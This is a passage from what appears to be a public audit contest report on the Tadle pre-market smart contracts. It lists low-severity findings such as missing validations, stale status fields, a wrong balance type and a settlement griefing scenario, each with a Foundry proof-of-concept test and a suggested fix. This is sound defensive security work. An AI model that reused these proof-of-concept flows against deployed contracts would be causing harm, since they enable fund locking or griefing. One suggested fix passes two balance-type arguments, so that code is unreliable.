- [0xmilenov](https://profiles.cyfrin.io/u/0xmilenov)
- [745fe9f9c2](https://profiles.cyfrin.io/u/745fe9f9c2)
- [baz1ka](https://profiles.cyfrin.io/u/baz1ka)
- [0xsecuri](https://profiles.cyfrin.io/u/0xsecuri)
- [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe)

Selected submission by: [0xreadyplayer1](https://profiles.cyfrin.io/u/0xreadyplayer1).
## Test Create Offer for 100 Percent Each Trade Tax
\u0060\u0060\u0060solidity
function test_create_offer_for_100_percent_eachTradeTax() public { 
    vm.startPrank(user); 
    preMarktes.createOffer( 
        CreateOfferParams( 
            marketPlace, 
            address(mockUSDCToken), 
            1000, 
            0.01 * 1e18, 
            12_000, 
            10_000, 
            OfferType.Ask, 
            OfferSettleType.Turbo 
        )  
    );
}
\u0060\u0060\u0060

### PoC Output
Ran 1 test for test/PreMarkets.t.sol:PreMarketsTest 
[PASS] test_create_offer_for_100_percent_eachTradeTax() (gas: 540682) 
Traces: 
[540682] PreMarketsTest::test_create_offer_for_100_percent_eachTradeTax() 
├─ [0] VM::startPrank(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf) 
│   └─ ← [Return]  
├─ [525720] UpgradeableProxy::createOffer(CreateOfferParams({ marketPlace: 0xE6b1c25C9BAC2B628d6E2d231F9B53b92172fC2D, tokenAddre
0, offerSettleType: 1 })) 

Offers with wrong each Trade Tax rate will be created, jeopardising Current and Future developments + Integrations with the protocol

Manual Review, Foundry

Ensure that in CreateOffer inside PreMarket, eachTradeTax needs to be less than 10_000

\u0060\u0060\u0060solidity
function createOffer(CreateOfferParams calldata params) external payable { 
    //snip 
    if (params.eachTradeTax >= Constants.EACH_TRADE_TAX_DECIMAL_SCALER) { 
        revert InvalidEachTradeTaxRate(); 
    } 
    //snip
}
\u0060\u0060\u0060
## L-10. Missing Validation in PreMarkets.abortBidTaker()
leading to funds lock.

Submitted by tigerfrake (https://profiles.cyfrin.io/u/tigerfrake), eeyore (https://profiles.cyfrin.io/u/eeyore), n3smaro (https://profiles.cyfrin.io/u/n3smaro), waydou (https://profiles.cyfrin.io/u/waydou). Selected submission by: eeyore (https://profiles.cyfrin.io/u/eeyore).
There is a missing validation in the \u0060PreMarkets.abortBidTaker()\u0060 function that fails to check whether the offer is actually a Bid offer. Without this check, a user can call this function with their Bid stock of an Ask offer, which can lead to funds being locked if the collateral ratio is greater than 100%.

There are other issues that, when fixed, will reveal additional problems in the \u0060PreMarkets.abortBidTaker()\u0060 function.
## Preconditions

1. The issue with overinflated maker refund when collateral ratio is > 100% in the \u0060PreMarkets.abortAskOffer()\u0060 function is fixed. This issue was reported separately. Assume the function is working as expected.

   File: \u0060PreMarkets.sol\u0060
   \u0060\u0060\u0060solidity
   uint256 totalDepositAmount = OfferLibraries.getDepositAmount( 
       offerInfo.offerType, 
       offerInfo.collateralRate, 
       totalUsedAmount, 
       false, // <== should be true 
       Math.Rounding.Ceil 
   ); 
   \u0060\u0060\u0060

2. The issue with incorrect depositAmount calculation in the \u0060PreMarkets.abortBidTaker()\u0060 function is fixed. This issue was reported separately. Assume the calculation of the depositAmount value works as expected.

   File: \u0060PreMarkets.sol\u0060
   \u0060\u0060\u0060solidity
   uint256 depositAmount = stockInfo.points.mulDiv( 
       preOfferInfo.points, // <== incorrect; should be preOfferInfo.amount 
       preOfferInfo.amount, // <== incorrect denominator; should be preOfferInfo.points 
       Math.Rounding.Floor 
   ); 
   \u0060\u0060\u0060

### Scenario

Given the above preconditions, consider the following scenario:

1. The maker creates an Ask offer for 50 points for 50 USDC, with a 200% collateral ratio, and deposits 100 USDC as collateral.
2. The taker accepts this Ask offer for 25 points for 25 USDC.
3. The maker aborts the Ask offer, retrieving 50 USDC of collateral and leaving 50 USDC as compensation for the taker.
4. The taker can now call \u0060PreMarkets.abortBidTaker()\u0060. Since the function does not check if the offer is a Bid offer, the taker can mistakenly call this function. The calculations for the transferAmount do not account for the collateral ratio, so the taker receives only 25 USDC. An additional 25 USDC that were used as collateral are locked in the contract and lost.

Although it is user error to call \u0060PreMarkets.abortBidTaker()\u0060 instead of \u0060DeliveryPlace.closeBidTaker()\u0060 (which would correctly refund 50 USDC), the end result is that the user loses funds, and they are locked in the system.

Funds are locked.

Manual review.

Add validation in the \u0060PreMarkets.abortBidTaker()\u0060 function to ensure the offer is a Bid offer before proceeding with execution.

L-11. The user will be able to close Bid Offer even in case if marketplace is not in BidSettling.

Submitted by [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [0xaman](https://profiles.cyfrin.io/u/0xaman). Selected submission by: [0xaman](https://profiles.cyfrin.io/u/0xaman).
The owner of a bid offer will call closeBidOffer to close the bid. The bid offer should only be closed when the market is in the BidSettling state. However, the current code allows the owner to close the bid even when the market is in the AskSettling state.

The Tadle market maintains different statuses for various purposes. If the market is in the Online state, the takers and makers can place their offers for bids and asks. After the TGE phase, the market transitions to the AskSettling state. Following the TGE and the settlement period, the market moves to the BidSettling state.

The issue here is that the owner should only be allowed to close a bid offer when the market is in the BidSettling state. However, the code currently checks for both BidSettling and AskSettling states, which means that a bid offer can be closed even when the market is in the AskSettling state.

\u0060\u0060\u0060solidity
function closeBidOffer(address _offer) external { 
    ( 
        OfferInfo memory offerInfo, 
        MakerInfo memory makerInfo, 
        , 
        MarketPlaceStatus status 
    ) = getOfferInfo(_offer); 
    if (_msgSender() != offerInfo.authority) { 
        revert Errors.Unauthorized(); 
    } 
    if (offerInfo.offerType == OfferType.Ask) { 
        revert InvalidOfferType(OfferType.Bid, OfferType.Ask); 
    } 
    if ( 
        status != MarketPlaceStatus.AskSettling && 
        status != MarketPlaceStatus.BidSettling 
    ) { 
        revert InvaildMarketPlaceStatus();  
    } 
}
\u0060\u0060\u0060
## POC:
Add following test case to PreMarket.t.sol:
## Function: test_Close_Bid_Offer_In_AskSettling
\u0060\u0060\u0060solidity
function test_Close_Bid_Offer_In_AskSettling() public { 
    vm.startPrank(user); 
    preMarktes.createOffer( 
        CreateOfferParams( 
            marketPlace, 
            address(mockUSDCToken), 
            1000, 
            0.01 * 1e18, 
            12000, 
            300, 
            OfferType.Bid, 
            OfferSettleType.Turbo 
        ) 
    );
    address offerAddr = GenerateAddress.generateOfferAddress(0); 
    preMarktes.createTaker(offerAddr, 1000); 
    vm.stopPrank(); 
    vm.startPrank(user1); 
    systemConfig.updateMarket( 
        "Backpack", 
        address(mockPointToken), 
        0.01 * 1e18, 
        block.timestamp - 1, 
        3600 
    );
    // upddate the market status only for assertion purpose 
    systemConfig.updateMarketPlaceStatus( 
        "Backpack", 
        MarketPlaceStatus.AskSettling 
    );
    vm.stopPrank(); 
    address _marketPlace = GenerateAddress.generateMarketPlaceAddress( 
        "Backpack" 
    );
    MarketPlaceInfo memory info = systemConfig.getMarketPlaceInfo( 
        _marketPlace 
    );
    assertEq(uint(info.status), uint(MarketPlaceStatus.AskSettling)); 
    vm.startPrank(user); 
    deliveryPlace.closeBidOffer(offerAddr); 
    vm.stopPrank(); 
}
\u0060\u0060\u0060

### Run With Command
\u0060forge test --mt test_Close_Bid_Offer_In_AskSettling\u0060

The offer owner is currently allowed to close a bid offer even when the market is in the AskSettling status. However, AskSettling is intended for settling Ask Offers, not Bid Offers. Tadle also maintains specific time frames for each market state.

- Manual Review

Remove AskSettling check for if condition.
Submitted by p0wd3r (https://profiles.cyfrin.io/u/p0wd3r), 0xaraj (https://profiles.cyfrin.io/u/0xaraj), josh4324 (https://profiles.cyfrin.io/u/josh4324), robertodf99 (https://profiles.cyfrin.io/u/robertodf99), audinarey (https://profiles.cyfrin.io/u/audinarey). Selected submission by: robertodf99 (https://profiles.cyfrin.io/u/robertodf99).

The OfferInfo struct contains various elements, including two fields specifically intended to store the trade tax charged and the amount of collateral settled:

\u0060\u0060\u0060solidity
struct OfferInfo { 
    uint256 id; 
    address authority; 
    address maker; 
    OfferStatus offerStatus; 
    OfferType offerType; 
    AbortOfferStatus abortOfferStatus; 
    uint256 points; 
    uint256 amount; 
    uint256 collateralRate; 
    uint256 usedPoints; 
    uint256 tradeTax; 
    uint256 settledPoints; 
    uint256 settledPointTokenAmount; 
    uint256 settledCollateralAmount; 
} 
\u0060\u0060\u0060

However, neither of these two fields is updated at any time.

When users query information using the PreMarkets::getOfferInfo getter function, they receive incorrect data. This discrepancy can impact frontend functionalities.

See PoC below:
## L-13. PreMarket::createTaker Should Update the offerInfo.offerStatus According to amount usedPoints

\u0060\u0060\u0060solidity
function test_offer_params_not_updated() public { 
    vm.startPrank(user); 
    preMarktes.createOffer( 
        CreateOfferParams( 
            marketPlace, 
            address(mockUSDCToken), 
            1000, 
            0.01 * 1e18, 
            12000, 
            300, 
            OfferType.Ask, 
            OfferSettleType.Turbo 
        ) 
    );
    vm.stopPrank(); 
    vm.startPrank(user1); 
    mockUSDCToken.approve(address(tokenManager), type(uint256).max); 
    address stockAddr = GenerateAddress.generateStockAddress(0); 
    address offerAddr = GenerateAddress.generateOfferAddress(0); 
    preMarktes.createTaker(offerAddr, 500); 
    vm.stopPrank(); 
    vm.prank(user1); 
    systemConfig.updateMarket( 
        "Backpack", 
        address(mockPointToken), 
        0.01 * 1e18, 
        block.timestamp - 1, 
        3600 
    );
    vm.startPrank(user); 
    mockPointToken.approve(address(tokenManager), type(uint256).max); 
    deliveryPlace.settleAskMaker(offerAddr, 500); 
    OfferInfo memory offerInfo = preMarktes.getOfferInfo(offerAddr); 
    assertEq(offerInfo.tradeTax, 0); 
    assertEq(offerInfo.settledCollateralAmount, 0); 
}
\u0060\u0060\u0060

- Manual review.

Ensure that the trade tax is updated when the taker accepts the offer. Similarly, update the settled collateral when it is returned, such as when the offer is either closed or settled.

4rdiii (https://profiles.cyfrin.io/u/4rdiii), 4lifemen (https://profiles.cyfrin.io/u/4lifemen), 0xbrivan2 (https://profiles.cyfrin.io/u/0xbrivan2), audinarey (https://profiles.cyfrin.io/u/audinarey), amaron (https://profiles.cyfrin.io/u/amaron), iamthesvn (https://profiles.cyfrin.io/u/iamthesvn). Selected submission by: 4rdiii (https://profiles.cyfrin.io/u/4rdiii).
The offerStatus enum in the PreMarket contract has several statuses to indicate the state of an offer. However, the createTaker function does not update the offerInfo.offerStatus based on whether at least one trade has happened or if all points in an order are used. This oversight contradicts the documentation and NATSPEC, which specify that offerStatus should be set to Ongoing when at least one trade has occurred or Filled if all points in an order are used.

The offerInfo.offerStatus is crucial for users to understand the availability and state of an offer. Despite this, the createTaker function does not update the offerInfo.offerStatus at any point during its execution, even though it modifies the usedPoints.

/** 
 * @dev Offer status 
 * @notice Unknown, Virgin, Ongoing, Canceled, Filled, Settling, Settled 
 * @param Unknown offer not yet exist. 
 * @param Virgin offer has been listed, but not one trade. 
 * @param Ongoing offer has been listed, and already one trade. 
 * @param Canceled offer has been canceled. 
 * @param Filled offer has been filled. 
 * @param Settling offer is settling. 
 * @param Settled offer has been settled, the last status. 
 */ 
enum OfferStatus { 
    Unknown, 
    Virgin, 
    Ongoing, 
    Canceled, 
    Filled, 
    Settling, 
    Settled 
} 

The createTaker function should update the offerInfo.offerStatus after updating the usedPoints according to the usedPoints value.
## Missing Logic to Update Offer Status

\u0060\u0060\u0060solidity
function createTaker(address _offer, uint256 _points) external payable { 
    ...
    offerInfo.usedPoints = offerInfo.usedPoints + _points; 
    // Missing logic to update offerStatus 
    stockInfoMap[stockAddr] = StockInfo({ 
        id: offerId, 
        stockStatus: StockStatus.Initialized, 
        stockType: offerInfo.offerType == OfferType.Ask 
            ? StockType.Bid 
            : StockType.Ask, 
        authority: _msgSender(), 
        maker: offerInfo.maker, 
        preOffer: _offer, 
        points: _points, 
        amount: depositAmount, 
        offer: address(0x0) 
    }); 
    offerId = offerId + 1; 
    uint256 remainingPlatformFee = _updateReferralBonus( 
        platformFee, 
        depositAmount, 
        stockAddr, 
        makerInfo, 
        referralInfo, 
        tokenManager 
    );
    makerInfo.platformFee = makerInfo.platformFee + remainingPlatformFee; 
    _updateTokenBalanceWhenCreateTaker( 
        _offer, 
        tradeTax, 
        depositAmount, 
        offerInfo, 
        makerInfo, 
        tokenManager 
    );
    /// @dev emit CreateTaker 
    emit CreateTaker( 
        _offer, 
        msg.sender, 
        stockAddr, 
        _points, 
        depositAmount, 
        tradeTax, 
        remainingPlatformFee 
    );
}
\u0060\u0060\u0060

Users may attempt to interact with offers that are marked as Virgin or Unknown but are actually Filled or Ongoing, leading to potential reverts. This issue undermines the reliability of the contract\u0027s documentation and NATSPEC, potentially causing confusion among users.

Manual Review
The \u0060createTaker\u0060 function should explicitly update the \u0060offerInfo.offerStatus\u0060 based on the \u0060usedPoints\u0060 to accurately reflect the offer\u0027s state. Here\u0027s how the corrected function might look:

\u0060\u0060\u0060solidity
function createTaker(address _offer, uint256 _points) external payable { 
    . 
    . 
    . 
    offerInfo.usedPoints = offerInfo.usedPoints + _points; 
    if (offerInfo.usedPoints == offerInfo.points){ 
        offerInfo.offerStatus = OfferStatus.Filled; 
    }else{ 
        offerInfo.offerStatus = OfferStatus.Ongoing; 
    } 
    stockInfoMap[stockAddr] = StockInfo({ 
        id: offerId, 
        stockStatus: StockStatus.Initialized, 
        stockType: offerInfo.offerType == OfferType.Ask 
            ? StockType.Bid 
            : StockType.Ask, 
        authority: _msgSender(), 
        maker: offerInfo.maker, 
        preOffer: _offer, 
        points: _points, 
        amount: depositAmount, 
        offer: address(0x0) 
    }); 
    offerId = offerId + 1; 
    uint256 remainingPlatformFee = _updateReferralBonus( 
        platformFee, 
        depositAmount, 
        stockAddr, 
        makerInfo, 
        referralInfo, 
        tokenManager 
    );
    makerInfo.platformFee = makerInfo.platformFee + remainingPlatformFee; 
    _updateTokenBalanceWhenCreateTaker( 
        _offer, 
        tradeTax, 
        depositAmount, 
        offerInfo, 
        makerInfo, 
        tokenManager 
    );
    /// @dev emit CreateTaker 
    emit CreateTaker( 
        _offer, 
        msg.sender, 
        stockAddr, 
        _points, 
        depositAmount, 
        tradeTax, 
        remainingPlatformFee 
    );
}
\u0060\u0060\u0060
**Submitted by** [4gontuk](https://profiles.cyfrin.io/u/4gontuk), [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [kwakudr](https://profiles.cyfrin.io/u/kwakudr), [josh4324](https://profiles.cyfrin.io/u/josh4324). Selected submission by: [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r).

Maker\u0027s stock status not updated.

In \u0060abortAskOffer\u0060, \u0060closeBidOffer\u0060 and \u0060settleAskMaker\u0060, only the maker\u0027s offer status is updated, and the maker\u0027s stock status is not updated.

[Link to DeliveryPlace.sol](https://github.com/Cyfrin/2024-08-tadle/blob/main/src/core/DeliveryPlace.sol#L78-L79)
\u0060\u0060\u0060solidity
IPerMarkets perMarkets = tadleFactory.getPerMarkets(); 
perMarkets.updateOfferStatus(_offer, OfferStatus.Settled); 
\u0060\u0060\u0060

[Link to DeliveryPlace.sol](https://github.com/Cyfrin/2024-08-tadle/blob/main/src/core/DeliveryPlace.sol#L309-L314)
\u0060\u0060\u0060solidity
IPerMarkets perMarkets = tadleFactory.getPerMarkets(); 
perMarkets.settledAskOffer( 
    _offer, 
    _settledPoints, 
    settledPointTokenAmount 
);
\u0060\u0060\u0060

[Link to PreMarkets.sol](https://github.com/Cyfrin/2024-08-tadle/blob/main/src/core/PreMarkets.sol#L631-L632)
\u0060\u0060\u0060solidity
offerInfo.abortOfferStatus = AbortOfferStatus.Aborted; 
offerInfo.offerStatus = OfferStatus.Settled; 
\u0060\u0060\u0060
This means that the maker\u0027s stock status remains Initialized, while it should actually be set to Finished like the taker.
\u0060\u0060\u0060solidity
perMarkets.updateStockStatus(_stock, StockStatus.Finished); 
\u0060\u0060\u0060

Maker\u0027s stock status not updated.

vscode

Set \u0060Finished\u0060 in the end.
When the DeliveryPlace::settleAskMaker() function calls tokenManager.addTokenBalance() to update the user balance, the TokenBalanceType parameter uses an operation, resulting in a balance update error.

The source code snippet of the DeliveryPlace::settleAskMaker() function is as follows. As marked by @>, TokenBalanceType is used incorrectly.

\u0060\u0060\u0060solidity
function settleAskMaker(address _offer, uint256 _settledPoints) external { 
    // SNIP... 
    @>        uint256 makerRefundAmount; 
    if (_settledPoints == offerInfo.usedPoints) { 
        if (offerInfo.offerStatus == OfferStatus.Virgin) { 
            makerRefundAmount = OfferLibraries.getDepositAmount( 
                offerInfo.offerType, 
                offerInfo.collateralRate, 
                offerInfo.amount, 
                true, 
                Math.Rounding.Floor 
            ); 
        } else { 
            uint256 usedAmount = offerInfo.amount.mulDiv( 
                offerInfo.usedPoints, 
                offerInfo.points, 
                Math.Rounding.Floor 
            ); 
            makerRefundAmount = OfferLibraries.getDepositAmount( 
                offerInfo.offerType, 
                offerInfo.collateralRate, 
                usedAmount, 
                true, 
                Math.Rounding.Floor 
            ); 
        } 
        tokenManager.addTokenBalance( 
            @>                TokenBalanceType.SalesRevenue, 
                _msgSender(), 
                makerInfo.tokenAddress, 
            @>                makerRefundAmount 
        ); 
    } 
    // SNIP... 
}
\u0060\u0060\u0060

To demonstrate the issue, add the following test code to test/PreMarkets.t.sol and run it:
## Code Analysis

\u0060\u0060\u0060solidity
function testAskPointAndAmount() public { 
    /////////////////////////// 
    // user create Bid.Offer // 
    /////////////////////////// 
    vm.prank(user); 
    // transfer mockUSDCToken 1e16 to capitalPool 
    preMarktes.createOffer( 
        CreateOfferParams( 
            marketPlace, 
            address(mockUSDCToken), 
            1000,  
            0.01 * 1e18,  
            12000,  
            300,  
            OfferType.Ask, 
            OfferSettleType.Turbo 
        ) 
    );
    
    // Cache user\u0027s offer address 
    address offerAddr = GenerateAddress.generateOfferAddress(0); 
    //////////////////////// 
    // user2 create Taker // 
    //////////////////////// 
    vm.prank(user2); 
    // transfer mockUSDCToken 1.235e16 to capitalPool 
    preMarktes.createTaker(offerAddr, 1000); 
    // Cache user2\u0027s stock address 
    address user2StockAddr = GenerateAddress.generateStockAddress(1); 
    
    //////////////////////// 
    // admin updateMarket // 
    //////////////////////// 
    vm.prank(user1); 
    systemConfig.updateMarket( 
        "Backpack", 
        address(mockPointToken), 
        0.01 * 1e18, 
        block.timestamp - 1, 
        3600 
    );
    ////////////////////////// 
    // user settleAskMaker  // 
    //////////////////////////        
    vm.startPrank(user); 
    mockPointToken.approve(address(tokenManager), 10000 * 10 ** 18); 
    // transfer mockPointToken 1e19 to capitalPool 
    deliveryPlace.settleAskMaker(offerAddr, 1000); 
    vm.stopPrank(); 
    ////////////////////////// 
    // user2 closeBidTaker  // 
    //////////////////////////    
    vm.prank(user2); 
    deliveryPlace.closeBidTaker(user2StockAddr); 
    ////////////////////////// 
    //  check user balance  // 
    ////////////////////////// 
    // user 
    console2.log("--------------- user balance ---------------"); 
    balanceHelper(user); 
}
\u0060\u0060\u0060
## Incorrect Token Balance Type Usage

\u0060\u0060\u0060solidity
// helper 
function balanceHelper(address _user) view public { 
    uint256 usermockUSDCTokenAmount_TaxIncome = tokenManager.userTokenBalanceMap( 
        address(_user), 
        address(mockUSDCToken), 
        TokenBalanceType.TaxIncome 
    );
    console2.log("usermockUSDCTokenAmount_TaxIncome:",usermockUSDCTokenAmount_TaxIncome); 
    uint256 usermockUSDCTokenAmount_ReferralBonus = tokenManager.userTokenBalanceMap( 
        address(_user), 
        address(mockUSDCToken), 
        TokenBalanceType.ReferralBonus 
    );
    console2.log("usermockUSDCTokenAmount_ReferralBonus:",usermockUSDCTokenAmount_ReferralBonus); 
    uint256 usermockUSDCTokenAmount_SalesRevenue = tokenManager.userTokenBalanceMap( 
        address(_user), 
        address(mockUSDCToken), 
        TokenBalanceType.SalesRevenue 
    );
    console2.log("usermockUSDCTokenAmount_SalesRevenue:",usermockUSDCTokenAmount_SalesRevenue); 
    uint256 usermockUSDCTokenAmount_RemainingCash = tokenManager.userTokenBalanceMap( 
        address(_user), 
        address(mockUSDCToken), 
        TokenBalanceType.RemainingCash 
    );
    console2.log("usermockUSDCTokenAmount_RemainingCash:",usermockUSDCTokenAmount_RemainingCash); 
    uint256 usermockUSDCTokenAmount_MakerRefund = tokenManager.userTokenBalanceMap( 
        address(_user), 
        address(mockUSDCToken), 
        TokenBalanceType.MakerRefund 
    );
    console2.log("usermockUSDCTokenAmount_MakerRefund:",usermockUSDCTokenAmount_MakerRefund); 
    uint256 usermockUSDCTokenAmount_PointToken = tokenManager.userTokenBalanceMap( 
        address(_user), 
        address(mockUSDCToken), 
        TokenBalanceType.PointToken 
    );
    console2.log("usermockUSDCTokenAmount_PointToken:",usermockUSDCTokenAmount_PointToken); 
}
\u0060\u0060\u0060

From the following output, we can see that \u0060userTokenBalanceMap[user][address(mockUSDCToken)][TokenBalanceType.SalesRevenue] == 22000000000000000(2.2e16)\u0060, while the actual values should be \u0060userTokenBalanceMap[user][address(mockUSDCToken)][TokenBalanceType.SalesRevenue] == 1e16\u0060 and \u0060userTokenBalanceMap[user][address(mockUSDCToken)][TokenBalanceType.MakerRefund] == 1.2e16\u0060.

[PASS] testAskPointAndAmount() (gas: 1172769) 

Logs:
--------------- user balance --------------- 
usermockUSDCTokenAmount_TaxIncome: 300000000000000 
usermockUSDCTokenAmount_ReferralBonus: 0 
@>  usermockUSDCTokenAmount_SalesRevenue: 22000000000000000 
usermockUSDCTokenAmount_RemainingCash: 0 
@>  usermockUSDCTokenAmount_MakerRefund: 0 
usermockUSDCTokenAmount_PointToken: 0 

[DeliveryPlace.sol](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L222-L325)

The source code snippet of the \u0060DeliveryPlace::settleAskMaker()\u0060 function is as follows. As marked by @>, \u0060TokenBalanceType\u0060 is used incorrectly.
- Manual Review

\u0060\u0060\u0060solidity
tokenManager.addTokenBalance( 
            TokenBalanceType.MakerRefund, 
            TokenBalanceType.SalesRevenue,  
            _msgSender(), 
            makerInfo.tokenAddress, 
            makerRefundAmount 
);
\u0060\u0060\u0060
## Test Again:
[PASS] testAskPointAndAmount() (gas: 1224694)  
Logs:
\u0060\u0060\u0060
--------------- user balance --------------- 
usermockUSDCTokenAmount_TaxIncome: 300000000000000 
usermockUSDCTokenAmount_ReferralBonus: 0 
@>  usermockUSDCTokenAmount_SalesRevenue: 10000000000000000 
usermockUSDCTokenAmount_RemainingCash: 0 
@>  usermockUSDCTokenAmount_MakerRefund: 12000000000000000 
usermockUSDCTokenAmount_PointToken: 0 
\u0060\u0060\u0060

### High Risk of Griefing Attack During Settlement Period in Protected Mode
Submitted by [touthang](https://profiles.cyfrin.io/u/touthang), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [meeve](https://profiles.cyfrin.io/u/meeve). Selected submission by:  
[0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2).

In Protected Mode, higher-ranked traders in the settlement process can delay their point settlements until the end of the settlement period, preventing subsequent traders from settling their points, and leading to forced collateral liquidation that cascades down the trading sequence, causing financial loss to subsequent traders.

In Protected Mode, all sellers, whether they are the original or subsequent ones, are required to deposit crypto as collateral. Upon settlement, each seller must transfer tokens to the buyer according to the trading sequence, as outlined in the documentation ([link](https://tadle.gitbook.io/tadle/how-tadle-works/mechanics-of-tadle/protected-mode)). Ask-offer settlements occur within a specified windowed period ([link](https://github.com/tadle-com/market-evm/blob/bbb19276f709841d19f299c18f529d09c151c00a/src/libraries/MarketPlaceLibraries.sol#L41-L43)) before bidding settlements start; when the market status is AskSettling.

The issue is that malicious ask-offers higher up in the trading sequence can delay their point settlements until the very end of the settlement period, potentially by front-running updateMarket transactions when the owner sets the TGE event. As a result, traders in the middle of the sequence, who still need to settle points with subsequent traders, may not receive the necessary points in time. This delay prevents them from settling within the designated settlement period, forcing the owner to call settleAskTaker to forcefully settle their offers ([link](https://github.com/tadle-com/market-evm/blob/bbb19276f709841d19f299c18f529d09c151c00a/src/core/DeliveryPlace.sol#L262-L263)) and subsequent traders trigger the liquidation of collateral through the closeBidTaker function to get refunded with the token points they did not receive.
\u0060\u0060\u0060solidity
function closeBidTaker(address _stock) external { 
    //... 
    (
        OfferInfo memory preOfferInfo, 
        MakerInfo memory makerInfo, 
        , 
    ) = getOfferInfo(stockInfo.preOffer); 
    OfferInfo memory offerInfo; 
    uint256 userRemainingPoints; 
    
    if (makerInfo.offerSettleType == OfferSettleType.Protected) { 
        offerInfo = preOfferInfo; 
        userRemainingPoints = stockInfo.points;      
    }else {// ...}  
    // ...
    uint256 collateralFee; 
    if (offerInfo.usedPoints > offerInfo.settledPoints) { 
        if (offerInfo.offerStatus == OfferStatus.Virgin) {// ... 
        } else { 
            uint256 usedAmount = offerInfo.amount.mulDiv( 
                offerInfo.usedPoints, 
                offerInfo.points, 
                Math.Rounding.Floor 
            ); 
            collateralFee = OfferLibraries.getDepositAmount( 
                offerInfo.offerType, 
                offerInfo.collateralRate, 
                usedAmount, 
                true, 
                Math.Rounding.Floor 
            ); 
        } 
    }
    uint256 userCollateralFee = collateralFee.mulDiv( 
        userRemainingPoints, 
        offerInfo.usedPoints,  
        Math.Rounding.Floor 
    ); 
    tokenManager.addTokenBalance( 
        TokenBalanceType.RemainingCash, 
        _msgSender(), 
        makerInfo.tokenAddress, 
        userCollateralFee 
    ); 
    // ...
} 
\u0060\u0060\u0060
## Vulnerability Explanation
As seen above, in the Protected Mode, if ask-offers do not settle their points, their collateral will be liquidated and distributed to the offer takers. This liquidation can cascade down the trading sequence, as subsequent traders who are unable to settle their points will also have their collateral liquidated.

## Proof Of Concept
Consider the following example:
1. Alice, the initial market maker, lists 1,000 points for sale at $1 per unit and deposits $1,000 as collateral, **with Protected mode.
2. Bob buys 500 points from Alice for $500. This amount is credited to Alice\u0027s balance and is available for withdrawal.
3. Bob, now a maker, lists the 500 points he purchased at a price of $1.10 per point and deposits $550 as collateral.
4. Dany buys 500 points from Bob at $1.10 per unit, paying $550. This amount is credited to Bob\u0027s balance and is available for withdrawal.
## Malicious Traders Can Delay Settlements
As the owner updates the market and sets the TGE, the market enters the AskSettling period:
1. Alice delays settling her points to Bob until the very end of the settling period. Notice that Bob cannot settle his points to Dany until he receives them from Alice.
2. Bob eventually receives the token points from Alice\u0027s settlement but cannot settle them to Dany because the settlement period has ended, and the market has now entered the BidSettling phase.
3. The owner will call \u0060settleAskMaker\u0060 (https://github.com/tadle-com/market-evm/blob/bbb19276f709841d19f299c18f529d09c151c00a/src/core/DeliveryPlace.sol#L262-L263) to forcefully settle Bob\u0027s offer.
4. Since Dany did not receive the token points from Bob, she calls \u0060closeBidTaker\u0060 to claim a refund from Bob\u0027s collateral. Notice that if Dany herself has points to settle to subsequent traders, the liquidation will continue cascading down through the trading sequence.

Malicious traders in the trading sequence can delay settling their points until the very end of the settlement period, preventing subsequent traders from settling their points. This leads to the liquidation of collateral for those traders, allowing the malicious traders to cause cascading collateral liquidation.

- Manual Review

The root cause of this issue is that settlements must occur according to the trading sequence, which is essential in Protected Mode. To mitigate this risk, one solution could be to implement a settlement period for each trader in the trading sequence. This approach would prevent griefing attacks by ensuring that each trader has an appropriate window to settle their points.
## OfferStatus are Never Used
Submitted by [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [cheatcode](https://profiles.cyfrin.io/u/cheatcode), [tinnohofficial](https://profiles.cyfrin.io/u/tinnohofficial), [amaron](https://profiles.cyfrin.io/u/amaron), [_frolic](https://profiles.cyfrin.io/u/_frolic), [demorextess](https://profiles.cyfrin.io/u/demorextess), [audinarey](https://profiles.cyfrin.io/u/audinarey). Selected submission by: [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful).

There are several issues and inconsistencies that arise from the way the protocol uses the OfferStatus enum. Due to lack of answers from devs, incomplete documentation that contradicts the code sometimes, and even the same code that seems to mean different things. It is hard to determine if some of the issues are real or not. There are 3 OfferStatus (https://github.com/Cyfrin/2024-08-tadle/blob/main/src/storage/OfferStatus.sol#L15) not used at all: Filled, Settling, and Ongoing. And the Virgin status is wrongly applied according to its definition. The incorrect use of Virgin is for sure an issue and I\u0027ve submitted it separately from this one. This one showcases issues that can be derived from the lack of use of the other 3 states. Yet due to the ambiguity of the codebase, it is hard to determine if all arising issues are intended or not. Just in case, here I report them.

Filled, Settling, and Ongoing offer statuses are never used. Due to lack of complete documentation respecting this and the devs not answering questions probably due to an overload of them, I can\u0027t decide on time if this has been intentional or an oversight. Thus the validity of all issues related to the lack of use of these states is not clear. I do think the great ambiguity on the topic should deem as 1 valid collective issue anyway. This part of the protocol about OfferState transitions is unauditable because for an audit to be taken you should clearly know what the code is meant to mean and do.

Here is a clear example of the confusion and contradictory information in the codebase: Settling in 2-txs is impossible as the Settling status is not used. If you partially settle tokens the offer will be marked as Settled and revert in future transactions (here (https://github.com/Cyfrin/2024-08-tadle/blob/main/src/core/DeliveryPlace.sol#L243)) that pretend to fully complete settling the offer. The code indicates this is not meant to be allowed but the existence of the Settling status indicates it was probably meant to be allowed. This is what I meant by contradictory information due to code actions, meanings, and poor documentation which makes the code unauditable as you can\u0027t know if this is a valid finding or just intended behavior. Anyway, here I report it.

Other errors derived from the lack of usage of these states are the obvious ones:
Filled should be used when all points are sold and it is not (this was said by the dev in a code walkthrough, exactly here (https://www.youtube.com/watch?v=JLaqo4cBB40&t=1906s)) being used. Ongoing seems to be intended to be used when only a part of the points are sold, but it is not being used.

Clearly define what the code is meant to do and mean with every OfferStatus defined and then refactor and reaudit the code.

ℹ Note 
If the incorrect usage of the 3 states is deemed as 3 different issues I would appreciate this issue being deemed as 3 valid ones. Sorry if this is not the correct way of reporting this, this contest is pretty confusing.
## L-18. Low Severity Issues
Submitted by [vinica_boy](https://profiles.cyfrin.io/u/vinica_boy).

### L01: Wrong event emitted when calling \u0060settleAskTaker()\u0060
